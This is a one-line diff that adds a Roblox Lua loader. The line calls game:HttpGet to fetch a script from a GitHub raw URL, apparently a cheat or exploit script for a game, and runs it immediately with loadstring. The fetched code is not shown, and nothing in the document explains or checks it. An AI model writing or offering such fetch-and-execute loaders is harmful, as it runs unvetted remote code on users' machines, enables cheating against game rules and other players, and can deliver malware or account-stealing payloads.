@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/1-5x-hlwn-evade-spam1-m7t67p5km8b313.lua"))()
